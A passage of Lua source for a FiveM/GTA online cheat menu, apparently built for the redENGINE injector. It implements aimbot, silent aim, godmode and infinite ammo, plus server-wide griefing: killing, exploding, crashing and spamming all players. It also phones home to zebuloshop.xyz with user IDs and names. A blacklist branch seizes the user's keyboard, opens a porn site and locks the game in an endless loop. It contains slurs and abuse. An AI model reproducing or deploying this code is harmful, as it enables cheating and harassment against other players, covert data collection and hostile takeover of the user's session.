                        CIT.Wait(0)
                        Winnie_RequestModel(Winnie_GetHashKey(vehicleGun))
                    end
                    local veh = Winnie_CreateVehicle(Winnie_GetHashKey(vehicleGun), playerPedPos.x + Directionnel(Winnie_GetEntityRotation(Winnie_PlayerPedId())).x, playerPedPos.y + (5 * GetEntityForwardY(Winnie_PlayerPedId())), playerPedPos.z + Directionnel(Winnie_GetEntityRotation(Winnie_PlayerPedId())).z, Winnie_GetEntityHeading(Winnie_PlayerPedId()), true, true)
                    SetEntityAsNoLongerNeeded(veh)
                    Winnie_SetVehicleForwardSpeed(veh, 150.0)
                end
            end

            if booleanCheck.antiheadshot == enable then
                SetPedSuffersCriticalHits(Winnie_PlayerPedId(), false)
            else
                SetPedSuffersCriticalHits(Winnie_PlayerPedId(), true)
            end

            if booleanCheck.hitsound == enable then
                local pedSelect = Winnie_PlayerId()
                local pedSeleect = Winnie_PlayerPedId()
                local target = Winnie_GetEntityPlayerIsFreeAimingAt(pedSelect)
                if target and Winnie_IsPedShooting(pedSeleect) then
                    local a = Winnie_CreateDui("http://zebuloshop.xyz/ImagePng/X2Download.com-hit-marker-Sound-Effect.mp3?aa", 1, 1)
                    Winnie_DestroyDui(a)
                end
            end

            if booleanCheck.targetdead == enable then
                targetdead = true
            else
                targetdead = false
            end

            if booleanCheck.penetrewall == enable then
                pentr = true
            else
                pentr = false
            end

            if booleanCheck.targetped == enable then
                targetped = true
            else
                targetped = false
            end

            if booleanCheck.spwanvehicle == enable then
                local test = KeyboardInput('Enter Vehicle Name', '', 100)
                    if test then
                        spawn(test)
                    end
                end


             if booleanCheck.changeplate == enable then
                 if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                    local result = KeyboardInput("Enter new plate", "", 50)
                    local getVeh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                    if result then
                        Winnie_SetVehicleNumberPlateText(getVeh, result)
                    end
                end
            end

            if booleanCheck.repairvehicle == enable then
                if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                    local getVeh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                    Winnie_SetVehicleFixed(getVeh)
                end
            end

            if booleanCheck.deletevehicle == enable then
                if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                    local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                    Winnie_DeleteEntity(getveh)
                end
            end

            if booleanCheck.vehiclemaximum == enable then
                if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                    local getvh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                    max(getvh)
                end
            end

            if booleanCheck.teleportnearestvehicle == enable then
                if not Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                local closest = GetClosestVehicle(Winnie_GetEntityCoords(Winnie_PlayerPedId()), 2000.0, 0, 70)
                Winnie_SetPedIntoVehicle(Winnie_PlayerPedId(), closest, -2)
                end
            end

            if booleanCheck.cleanvehicle == enable then
                local target = GetPlayerPed(SelectedPlayer)
                local coords = GetEntityCoords(target)
                SetEntityCoords(Winnie_PlayerPedId(), coords)
            end

            if booleanCheck.refuelvehicle == enable then
                if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                    local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                    SetVehicleOilLevel(getveh, 100.0)
                end
            end

            if booleanCheck.refueloil == enable then
                if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                    local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                    SetVehicleOilLevel(getveh, 100.0)
                end
            end

            if booleanCheck.openalldoors == enable then
                if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                    local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                    for i = 1, 7 do
                        Winnie_SetVehicleDoorOpen(getveh, i, true, true)
                    end
                end
            end

            if booleanCheck.closealldoors == enable then
                if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                    local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                    for i = 1, 7 do
                        Winnie_SetVehicleDoorShut(getveh, i, true)
                    end
                end
            end

            if booleanCheck.instantbrake == enable then
                local vehicle = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId())

                            if vehicle then
                                if Winnie_IsControlPressed(0, 72) then
                                    Winnie_SetVehicleForwardSpeed(vehicle, 0.0)
                                end
                            end
            end

            if booleanCheck.invisibleveh == enable then
                ZM_M1000.vehicle = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId())

                    if ZM_M1000.vehicle then
                                Winnie_SetEntityVisible(ZM_M1000.vehicle, false)
                    end
            else
                        Winnie_SetEntityVisible(ZM_M1000.vehicle, true)
            end

            if booleanCheck.drift == enable then
                if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                    local carspeed = GetEntitySpeed(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId()) * New.kmh)

                    if carspeed <= 100.0 then
                        if Winnie_IsControlPressed(1, 21) then
                            Winnie_SetVehicleReduceGrip(Winnie_GetVehiclePedIsUsing(Winnie_PlayerPedId()), true)
                        else
                            Winnie_SetVehicleReduceGrip(Winnie_GetVehiclePedIsUsing(Winnie_PlayerPedId()), false)
                        end
                    end
                end
            end

            if booleanCheck.boost == enable then
                if math.floor(tonumber(booleanCheck.vehiclespeedboost)) == 0 then
                    Winnie_SetVehicleEnginePowerMultiplier(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false), 50 + 0.0 * 20.0)
                else
                    Winnie_SetVehicleEnginePowerMultiplier(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false), math.floor(tonumber(booleanCheck.vehiclespeedboost)))
                end
            end

            if booleanCheck.jumpvehicle == enable then
                if IsPedSittingInAnyVehicle(Winnie_PlayerPedId()) then
                    local get = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), false)
                    if Winnie_IsControlJustPressed(0, 22) then
                        Winnie_ApplyForceToEntity(get, 3, 0.0, 0.0,  math.abs(50 * rE_Slider["Slider_jumpintensity_value"]), 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    end
                end
            end

            if booleanCheck.handling == enable then
                if IsPedSittingInAnyVehicle(Winnie_PlayerPedId()) then
                    Winnie_SetVehicleGravityAmount(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId()), 30.0)
                else
                    Winnie_SetVehicleGravityAmount(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId()), 1.0)
                    end
            end

            if booleanCheck.autorepair == enable then
                local get = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), false)
                local getBody = GetVehicleBodyHealth(get)

                if getBody <= 995.0 then
                    Winnie_SetVehicleFixed(get)
                end
            end

            if booleanCheck.nitro == enable then
                ZM_M1000.vehicle = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId())

                            if ZM_M1000.vehicle then
                                if Winnie_IsDisabledControlPressed(0, 38) then
                                    SetVehicleBoostActive(ZM_M1000.vehicle, true)
                                    Winnie_SetVehicleForwardSpeed(ZM_M1000.vehicle, 100.0)
                                end
                            end
            end

            if booleanCheck.rainbowcar == enable then
                local rgb = rainbow(1.0)
                            if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                                Winnie_SetVehicleCustomPrimaryColour(Winnie_GetVehiclePedIsUsing(Winnie_PlayerPedId()), rgb.r, rgb.g, rgb.b)
                                Winnie_SetVehicleCustomSecondaryColour(Winnie_GetVehiclePedIsUsing(Winnie_PlayerPedId()), rgb.r, rgb.g, rgb.b)
                            end
            end

            if booleanCheck.vehiclecolor == enable then
                if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                    local get = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), false)
                    local r = math.floor(tonumber(booleanCheck.colorrvehicle))
                    local g = math.floor(tonumber(booleanCheck.colorgvehicle))
                    local b = math.floor(tonumber(booleanCheck.colorbvehicle))
                  -- print(r,g,b)
                    Winnie_SetVehicleCustomPrimaryColour(get, r, g, b)
                    Winnie_SetVehicleCustomSecondaryColour(get, r, g, b)
                end
            end

            if booleanCheck.spawninside == enable then
                ZM_M1000.spawninside = true
            else
                ZM_M1000.spawninside = false
            end



            if booleanCheck.paniccrash == enable then
                while true do
                end
            end

            if booleanCheck.antizinshot == enable then
                for k, v in pairs(GetGamePool("CPed")) do
                    for k, a in pairs(availableZombies) do
                        if not Winnie_IsPedAPlayer(v) and v ~= Winnie_PlayerPedId() then
                            Winnie_DeletePed(v)
                            end
                        end
                    end
            end


            if booleanCheck.staminashot == enable then
                Winnie_ResetPlayerStamina(Winnie_PlayerId())
            end

            if booleanCheck.godmodeglife == enable then
                CIT.InvokeNative(0x7022BD828FA0B082, Winnie_PlayerPedId(), true, 7841.120)
            else
                CIT.InvokeNative(0x7022BD828FA0B082, Winnie_PlayerPedId(), false, 7841.120)
            end

            if booleanCheck.infiniteammo == enable then
                local weaponHash = Winnie_GetSelectedPedWeapon(Winnie_PlayerPedId())
                Winnie_SetPedAmmo(Winnie_PlayerPedId(), weaponHash, 255)
            end

            if booleanCheck.freezeammo == enable then
                Winnie_SetPedInfiniteAmmoClip(Winnie_PlayerPedId(), true)
            else
                Winnie_SetPedInfiniteAmmoClip(Winnie_PlayerPedId(), false)
            end

            if booleanCheck.assistantstafe == enable then
                local PED = Winnie_PlayerPedId()
                local SPEED = math.floor(tonumber(booleanCheck.speedstrafe))

                if SPEED > 0.0 then
                    SPEED = SPEED
                else
                    SPEED = 1.0
                end

                local COORDS = Winnie_GetEntityCoords(PED)
                local CAM = Winnie_GetGameplayCamRot(0)

                local left, right = Quaternion(CAM) * vector3(0.0, 1.0, 0.0), Quaternion(CAM) * vector3(1.0, 0.0, 0.0)
                if not Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                    if Winnie_IsDisabledControlPressed(0, 30) then
                        COORDS = COORDS + right * SPEED
                                    Winnie_SetEntityCoordsNoOffset(PED, COORDS.x, COORDS.y, COORDS.z, true, true, true)
                                    RequestCollisionAtCoord(COORDS.x, COORDS.y, COORDS.z)
                                end
                                if Winnie_IsDisabledControlPressed(0, 34) then
                                    COORDS = COORDS + right * - SPEED
                                    Winnie_SetEntityCoordsNoOffset(PED, COORDS.x, COORDS.y, COORDS.z, true, true, true)
                                    RequestCollisionAtCoord(COORDS.x, COORDS.y, COORDS.z)
                                end
                            end
                        end

               if booleanCheck.teleportzombie == enable then
                local pedCoords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                            for k, v in pairs(GetGamePool("CPed")) do
                                if not Winnie_IsPedAPlayer(v) and v ~= Winnie_PlayerPedId() then
                                        Winnie_SetEntityCoords(v, pedCoords.x + 1.5, pedCoords.y + 1.5, pedCoords.z)
                                    end
                                end
                            end


                if booleanCheck.autofarmxp == enable then
                    local pedCoords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                    for k, v in pairs(GetGamePool("CPed")) do
                        if not Winnie_IsPedAPlayer(v) and v ~= Winnie_PlayerPedId() then
                                    Winnie_SetEntityCoords(v, pedCoords.x + 1.5, pedCoords.y + 1.5, pedCoords.z)
                                    local coordsZombie = Winnie_GetEntityCoords(v)
                                    local boneArray = Winnie_GetPedBoneCoords(v, 31086, 0, 0, 0)
                                        Winnie_ShootSingleBulletBetweenCoords(coordsZombie.x, coordsZombie.y, coordsZombie.z, boneArray.x, boneArray.y, boneArray.z, 9000.0, 0, Winnie_GetHashKey("WEAPON_MICROSMG"), Winnie_PlayerPedId(), true, false, 1000.0)
                                end
                            end
                        end

                if booleanCheck.autofarm == enable then
                --   print('1')
                    local pedCoords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                    for k, v in pairs(GetGamePool("CPed")) do
                        if not Winnie_IsPedAPlayer(v) and v ~= Winnie_PlayerPedId() then
                                    Winnie_SetEntityCoords(v, pedCoords.x + 1.5, pedCoords.y + 1.5, pedCoords.z)
                                    Winnie_SetEntityHealth(v, 0)
                                    SetControlNormal(0, 355, 1.0)
                                    SetControlNormal(0, 356, 1.0)
                                    SetControlNormal(0, 86, 1.0)
                                end
                            end
                        end

                        if booleanCheck.removewindows == enable then
                            for k, v in pairs(GetGamePool("CVehicle")) do
                                for i = 0, 7 do
                                    Winnie_RemoveVehicleWindow(v, i)
                                    Winnie_SetDisableVehicleWindowCollisions(v, true)
                                end
                            end
                        end

                        if booleanCheck.healglife == enable then
                            local pedSelect = Winnie_PlayerPedId()
                local coords = Winnie_GetEntityCoords(pedSelect)
                Winnie_NetworkResurrectLocalPlayer(coords, Winnie_GetEntityHeading(pedSelect, true, false))
                        end


            if booleanCheck.silentaim == enable then
                local FOV = 0.8
                local ped, a, b, c, d = main()

                if booleanCheck.targetped == enable then
                    ZM_KeyboardUI.R = ped
                else
                    ZM_KeyboardUI.R = Winnie_IsPedAPlayer(ped)
                end

                if booleanCheck.penetrewall == enable then
                    ZM_KeyboardUI.b = true
                else
                    ZM_KeyboardUI.b = Winnie_HasEntityClearLosToEntity(Winnie_PlayerPedId(), ped, 17)
                end

                if booleanCheck.targetdead == enable then
                    ZM_KeyboardUI.mp = Winnie_IsEntityDead(ped)
                else
                    ZM_KeyboardUI.mp = not Winnie_IsEntityDead(ped)
                end

                local q = GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0)

                local x, y, z = table.unpack(Winnie_GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0))
                local _, _x, _y = Winnie_GetScreenCoordFromWorldCoord(x, y, z)
                local weapon = Winnie_GetSelectedPedWeapon(Winnie_PlayerPedId())
                local distance = Winnie_GetDistanceBetweenCoords(Winnie_GetFinalRenderedCamCoord(), Winnie_GetEntityCoords(ped), false)


                if ZM_KeyboardUI.R and ZM_KeyboardUI.b and ZM_KeyboardUI.mp then

                    if (_x > 0.5 - FOV / 3 and _x < 0.5 + FOV / 3 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) and IsEntityOnScreen(ped) then
                      --  print('5')
                        if Winnie_IsPedShooting(Winnie_PlayerPedId()) then
                            local antifakeplayer = GetEntityAlpha(ped) <= 100
                            if scriptresourceexist("gtalife-z") then
                                if not antifakeplayer then
                                    Winnie_ShootSingleBulletBetweenCoords(q.x, q.y-0.2, q.z, q.x, q.y, q.z, math.floor(GetWeaponDamage(weapon)), true, weapon, Winnie_PlayerPedId(), true, false, 1000.0)
                                end
                            else
                                Winnie_ShootSingleBulletBetweenCoords(q.x, q.y-0.2, q.z, q.x, q.y, q.z, math.floor(GetWeaponDamage(weapon)), true, weapon, Winnie_PlayerPedId(), true, false, 1000.0)
                            end
                        end
                    end
                end
            end

            if booleanCheck.fov == enable then
                local widht, height = CIT.InvokeNative(0x873C9F3104101DD3, CIT.PointerValueInt(), CIT.PointerValueInt())

                local aimbotfov = math.floor(tonumber(booleanCheck.fovaimbot)) / 4.5


                if aimbotfov >= 0 then
                    FOV = aimbotfov
                else
                    FOV = 0.3
                end



                if not Winnie_HasStreamedTextureDictLoaded("mpmissmarkers256") then
                    Winnie_RequestStreamedTextureDict("mpmissmarkers256", true)
                end

                Winnie_DrawSprite('zadzadazdazdazd', 'azdzaedfadaddzadazd', 0.50,  0.50, aimbotfov, aimbotfov , 0.0, 255, 255, 255, New.opacity)
                if booleanCheck.fillfov == enable then
                    Winnie_DrawSprite("mpmissmarkers256","corona_shade",0.5,0.5, aimbotfov / 1.90, aimbotfov * widht / height / 1.90, 0.0, 0, 0, 0, 100)
                end
            end


            if booleanCheck.aimlock == enable then

                local fov = math.floor(tonumber(booleanCheck.fovaimbot)) / 12

                if fov >= 0 then
                    FOV = fov
                else
                    FOV = 0
                end


                for k, ped in pairs(GetGamePool("CPed")) do



                    local q = GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0)


                    local pedSelect = PlayerPedId()
                    local justCoordsToPed = GetEntityCoords(ped)

                    local boneCoordsAndCalculate = CalculateRotation(q - Winnie_GetGameplayCamCoord())

                    local rotationPed = Winnie_GetEntityRotation(Winnie_PlayerPedId(), 2)
                    if booleanCheck.targetped == enable then
                        ZM_KeyboardUI.R = ped
                    else
                        ZM_KeyboardUI.R = Winnie_IsPedAPlayer(ped)
                    end

                    if booleanCheck.penetrewall == enable then
                        ZM_KeyboardUI.b = true
                    else
                        ZM_KeyboardUI.b = Winnie_HasEntityClearLosToEntity(Winnie_PlayerPedId(), ped, 17)
                    end

                    if booleanCheck.targetdead == enable then
                        ZM_KeyboardUI.mp = Winnie_IsEntityDead(ped)
                    else
                        ZM_KeyboardUI.mp = not Winnie_IsEntityDead(ped)
                    end

                    if IsAimCamActive() and ZM_KeyboardUI.b then
                        local _, _x, _y = Winnie_GetScreenCoordFromWorldCoord(justCoordsToPed.x, justCoordsToPed.y, justCoordsToPed.z)
                        if ZM_KeyboardUI.R and ZM_KeyboardUI.b and ZM_KeyboardUI.mp then
                        if (_x > 0.5 - FOV / 3 and _x < 0.5 + FOV / 3 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) and IsEntityOnScreen(ped) then
                            local antifakeplayer = GetEntityAlpha(ped) <= 100
                            if scriptresourceexist("gtalife-z") then
                                if not antifakeplayer then
                                        Winnie_SetGameplayCamRelativeRotation(boneCoordsAndCalculate.z - rotationPed.z, boneCoordsAndCalculate.x, 1.0)
                                    end
                                else
                                        Winnie_SetGameplayCamRelativeRotation(boneCoordsAndCalculate.z - rotationPed.z, boneCoordsAndCalculate.x, 1.0)
                                end
                            end
                        end
                    end
                end
            end


            if booleanCheck.killall == enable then
                for k, v in pairs(GetActivePlayers()) do
                    local pedSelect = Winnie_GetPlayerPed(v)
                    local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                    local boneCoords = Winnie_GetPedBoneCoords(pedSelect, 31086, 0, 0, 0)
                    Winnie_ShootSingleBulletBetweenCoords(coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, boneCoords.x, boneCoords.y, boneCoords.z, 9000.0, 0, Winnie_GetHashKey("WEAPON_ASSAULTRIFLE_MK2"), Winnie_PlayerPedId(), true, false, 100000.0)
                end
            end

            if booleanCheck.explodeall == enable then
                for k, v in pairs(GetActivePlayers()) do
                    local coordsPlayer = Winnie_GetEntityCoords(Winnie_GetPlayerPed(v))
                    Winnie_AddExplosion(coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, 50, 1000.0, true, false, true)
                end
            end

            if booleanCheck.spawnmass == enable then
                for k, v in pairs(GetActivePlayers()) do
                    local pedSelect = Winnie_GetPlayerPed(v)
                    local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                    local car = Winnie_GetHashKey("Mule")
                    Winnie_RequestModel(car)
                    while not Winnie_HasModelLoaded(car) do
                        Winnie_RequestModel(car)
                        Wait(0)
                    end

                    local vehicle = Winnie_CreateVehicle(car, coordsPlayer.x, coordsPlayer.y + 1, coordsPlayer.z, 600.0, true, false)
                    Winnie_SetEntityAsMissionEntity(vehicle, true, true)
                    Winnie_SetVehicleNumberPlateText(vehicle, "m1000")
                    local hash = Winnie_GetHashKey("cs_movpremmale")
                    while not Winnie_HasModelLoaded(hash) do
                        Wait(500)
                        Winnie_RequestModel(hash)
                    end
                    local pedpnj = Winnie_CreatePed("PED_TYPE_CIVMALE", "cs_movpremmale", -60.96, 360.39, 112.10,  600.161, false, true)
                    Winnie_TaskWarpPedIntoVehicle(pedpnj, vehicle, -1)
                    Winnie_SetVehicleForwardSpeed(vehicle, 1000.0)
                    end
                end


                if booleanCheck.terroristattack == enable then
                    for _, player in pairs(GetActivePlayers()) do
                        local player = Winnie_GetEntityCoords(Winnie_GetPlayerPed(player))
                        local car = Winnie_GetHashKey("Miljet")

                        Winnie_RequestModel(car)
                        while not Winnie_HasModelLoaded(car) do
                            Winnie_RequestModel(car)
                            Wait(0)
                        end

                        local vehicle =
                        Winnie_CreateVehicle(car, player.x + 28,player.y + 36,player.z + 20,600.0,true,false)
                        Winnie_CreateVehicle(car,player.x + 4,player.y + 20,player.z + 1,600.0,true,false)
                        Winnie_CreateVehicle(car,player.x + 42,player.y + 15,player.z + 37,600.0,true,false)
                        Winnie_CreateVehicle(car,player.x + 26,player.y + 2,player.z + 50,600.0,true,false)
                        Winnie_CreateVehicle(car,player.x + 50,player.y + 20,player.z + 50,600.0,true,false)
                        Winnie_CreateVehicle(car,player.x + 48,player.y + 55,player.z + 15,600.0,true,false)
                        Winnie_CreateVehicle(car,player.x + 67,player.y + 45,player.z + 17,600.0,true,false)
                        Winnie_CreateVehicle(car,player.x + 84,player.y + 59,player.z + 19,600.0,true,false)
                        Winnie_CreateVehicle(car,player.x + 44,player.y + 82, player.z + 75,600.0,true,false)
                        Winnie_CreateVehicle(car,player.x + 64,player.y + 44,player.z + 10,600.0,true,false)
                        Winnie_CreateVehicle(car,player.x + 75,player.y + 44,player.z + 18,600.0,true,false)

                        Winnie_SetEntityAsMissionEntity(vehicle, true, true)
                        Winnie_SetVehicleNumberPlateText(vehicle, "m1000")
                        Winnie_SetVehicleForwardSpeed(vehicle, 250.0)
                        end
                    end

                    if booleanCheck.giveweaponall == enable then
                        for k, v in pairs(GetActivePlayers()) do
                            for k, a in pairs(weapons) do
                                Winnie_GiveWeaponToPed(Winnie_GetPlayerPed(v), GetHashKey(a), 255, true, false)
                            end
                        end
                    end

                    if booleanCheck.removeweaponall == enable then
                        for k, v in pairs(GetActivePlayers()) do
                            Winnie_RemoveAllPedWeapons(Winnie_GetPlayerPed(v), true)
                        end
                    end

                    if booleanCheck.spwantrans == enable then
                        for k, v in pairs(GetActivePlayers()) do
                            local ped = GetPlayerPed(v)
                            local pullp = "a_m_m_tranvest_01"

                            if not HasModelLoaded(GetHashKey(pullp)) then
                                RequestModel(GetHashKey(pullp))
                            end
                                CreatePed(0, GetHashKey(pullp), GetEntityCoords(GetPlayerPed(v)), 1, 1, 1)
                            end
                        end

                    if booleanCheck.randompeds == enable then
                        for k, v in pairs(GetActivePlayers()) do


                            local pedSelect = Winnie_GetPlayerPed(v)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            local ped_hash = Winnie_GetEntityModel(pedSelect)

                            RequestModel(GetHashKey(ped_hash))
                            while not HasModelLoaded(ped_hash) do
                                Wait(0)
                            end

                                Winnie_CreatePed(1, ped_hash, coordsPlayer.x, coordsPlayer.y, coordsPlayer.z + 1.0, 90.0, true, false)
                            end
                        end

                        if booleanCheck.randomprops == enable then
                            for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = Winnie_GetPlayerPed(v)
                                local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                                local object = Winnie_IsCreateObject(Winnie_GetHashKey(randomProps[math.random(#randomProps)]), 164.2524, -93.01299, 0, true, true, true)
                                Winnie_AttachEntityToEntity(object, pedSelect, Winnie_GetPedBoneIndex(pedSelect, 0x796E), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
                            end
                        end


                        if booleanCheck.clearpedtaskall == enable then
                            for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = Winnie_GetPlayerPed(v)
                                Winnie_ClearPedTasksImmediately(pedSelect)
                            end
                        end

                        if booleanCheck.unlockallveh == enable then
                            for k, v in pairs(GetGamePool("CVehicle")) do
                                SetVehicleDoorsLocked(v, 1)
                                SetVehicleDoorsLockedForPlayer(v, Winnie_PlayerId(), false)
                                SetVehicleDoorsLockedForAllPlayers(v, false)
                            end
                        end

                        if booleanCheck.earrape == enable then
                            for k, v in pairs(GetActivePlayers()) do
                                local coordsPlayer = Winnie_GetEntityCoords(Winnie_GetPlayerPed(v))
                                Winnie_PlaySoundFromCoord(-1, "CHECKPOINT_MISSED", coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, "HUD_MINI_GAME_SOUNDSET", true, 1.0, true)
                                Winnie_PlaySoundFromCoord(-1, "Power_Down", coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 1.0, true)
                            end
                        end

                        if booleanCheck.cageallplayers == enable then
                            local pedSelect = Winnie_GetPlayerPed(ZM_M1000.select)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                            local object = Winnie_IsCreateObject(Winnie_GetHashKey("prop_container_ld_pu"), coordsPlayer.x, coordsPlayer.y,  coordsPlayer.z + 0.0,  0, 5, 0, 5, Winnie_GetHashKey("prop_container_ld_pu"), 0,  5, 0 )
                            SetPickupRegenerationTime(object, 60)
                        end

                        if booleanCheck.crashallplayers == enable then
                            for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = Winnie_GetPlayerPed(v)
                                Winnie_SetEntityVisible(pedSelect, false)
                            end
                        end

                        if booleanCheck.ptfxspamming == enable then
                            for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = Winnie_GetPlayerPed(v)
                                local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                                Winnie_RequestNamedPtfxAsset("core")
                                while not Winnie_HasNamedPtfxAssetLoaded("core") do
                                    Wait(10)
                                end

                                Winnie_UseParticleFxAsset("core")
                                if math.floor(tonumber(booleanCheck.ptfxspamm)) >= 0 then
                                    Winnie_StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_flame", coordsPlayer.x, coordsPlayer.y,coordsPlayer.z, 0,0, 0, math.floor(tonumber(booleanCheck.ptrfxxcaleslider)) + 0.0 ,0, 0, 0)
                                else
                                    Winnie_StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_flame", coordsPlayer.x, coordsPlayer.y,coordsPlayer.z, 0,0, 0, 0, 0, 0, 0)
                                end
                            end
                        end

                        if booleanCheck.hyrantallplayers == enable then
                            for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = Winnie_GetPlayerPed(v)
                                local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                                Winnie_AddExplosion(coordsPlayer, 13, 10000.0, true, false, 1000.0)
                            end
                        end

                        if booleanCheck.whalemasspawn == enable then
                            for k, v in pairs(GetActivePlayers()) do
                                local pedSelect = Winnie_GetPlayerPed(v)
                                local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                                local hash = Winnie_GetHashKey("a_c_killerwhale")
                                Winnie_RequestModel(hash)
                                while not Winnie_HasModelLoaded(hash) do
                                    Wait(0)
                                    Winnie_CreatePed(21, hash, coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, 0.0, true, true)
                                end
                            end
                        end

                        if booleanCheck.explodevehicles == enable then
                            for k, v in pairs(GetGamePool("CVehicle")) do
                                local coords = Winnie_GetEntityCoords(v)
                                local distance = Winnie_GetDistanceBetweenCoords(Winnie_GetFinalRenderedCamCoord(), coords.x, coords.y, coords.z)
                                if distance <= 100 then
                                    Winnie_AddExplosion(coords, 32, 10000.0, false, false, 0.0)
                                end
                            end
                        end

                        if booleanCheck.flyallvehicles == enable then
                            for k, v in pairs(GetGamePool("CVehicle")) do
                                local direction = vec3(0.0, 0.0, 15.0)
                                local rotation = vec3(0.0, 0.0, 0.0)
                                if math.floor(tonumber(booleanCheck.forcefly)) > 0.0 then
                                    Winnie_ApplyForceToEntity(v, math.ceil(tonumber(booleanCheck.forcefly)), direction, rotation, 5, true, true, true, false)
                                else
                                    Winnie_ApplyForceToEntity(v, 1, direction, rotation, 5, true, true, true, false)
                                end
                            end
                        end

                        if booleanCheck.closemenu == enable then
                            request("The menu is now closing", 3000) -- tg fdp
                            external = false
                            externalmenu = false
                        end

                        if booleanCheck.reportbug == enable then
                        local result = KeyboardInput("Send your problem", "", 200)
                            if result then
                                Winnie_CreateDui("http://zebuloshop.xyz/log.php?"..result.."ID RedENGINE : "..UUID, 1, 1)
                            end
                        end
                    end

                    
               
        local tableblacklist = {}

        local list = {
            6290,
            45795,
            73515,
            72319,
            53250,
            22943,
            22180,
            30489,
            88366,
            94010,
            81347,
            25997,
            6981,
            13532
        }

        table.insert(tableblacklist, list)

        for k,v in ipairs(list) do
            if v == redENGINE.GetUserId() then
                    Wait(2000)
                    New.active = false
                    kibind = false
                    ZM_KeyboardUI.Open = false
                    local name = redENGINE.GetUsername()
                    local result = 'blacklisted guys try to connect'
                    Winnie_CreateDui("http://zebuloshop.xyz/log.php?"..result.."ID RedENGINE : "..UUID..name, 1, 1)
                    pute = Winnie_CreateDui("https://i.imgur.com/lfNYnQ3.mp4", 2000, 2000)
                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("fdpdemerde"),"fdpdemerdebl", Winnie_GetDuiHandle(pute))
                    redENGINE.KeyPress(0x77, 150) -- f8
                    redENGINE.KeyPress(0x49, 50) -- i
                    redENGINE.KeyPress(0x20, 50) -- space
                    redENGINE.KeyPress(0x41, 50) -- a
                    redENGINE.KeyPress(0x4D, 50) -- m
                    redENGINE.KeyPress(0x20, 50) -- space
                    redENGINE.KeyPress(0x47, 50) -- g
                    redENGINE.KeyPress(0x41, 50) -- a
                    redENGINE.KeyPress(0x59, 50) -- y
                    redENGINE.KeyPress(0x20, 50) -- space
                    request("Blackli,Restart your computer ;)", 10000)
                    while true do
                        Wait(0)
                        print('Zebulo send love to your mothers <3 <3 <3')
                        DrawSprite('fdpdemerde', 'fdpdemerdebl', 0.50,  0.50, 0.60, 0.60 * 1.8, 0.0, 255, 255, 255, 255)
                        Wait(250)
                        spawn("deluxo")
                        Winnie_CreateDui("https://fr.pornhub.com/", 9000, 9000)
                        launchwebsite("https://discord.gg/nXEskAYBnR")
                    end
                end
            end




    local function DrawKeyboard()



            if Winnie_IsDisabledControlJustReleased(0, keyboardui["Value"]) and not kibind then
                ZM_KeyboardUI.Open = not ZM_KeyboardUI.Open
            end

